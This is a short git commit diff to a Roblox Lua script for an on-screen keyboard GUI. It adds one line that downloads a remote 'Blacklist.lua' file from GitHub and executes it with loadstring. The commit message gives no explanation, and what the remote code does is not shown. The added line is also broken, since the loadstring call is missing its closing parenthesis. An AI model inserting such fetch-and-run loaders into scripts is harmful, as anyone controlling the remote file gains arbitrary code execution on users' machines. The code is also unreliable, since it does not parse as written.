5ce9e9178a9e502609482aa0778823263addb060
ChillbyteHD <m66361544@gmail.com>
2025-08-30 19:33:04 +0300

    update KilobyteKeyboard.lua

--- KilobyteKeyboard.lua
+++ KilobyteKeyboard.lua
@@ -7,6 +7,8 @@ local TweenService        = game:GetService("TweenService")
 local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Something478/ScriptLoader/refs/heads/main/Blacklist.lua")
+
 local gui = Instance.new("ScreenGui")
 gui.Name = "KilobyteKeyboard"
 gui.ResetOnSpawn = false
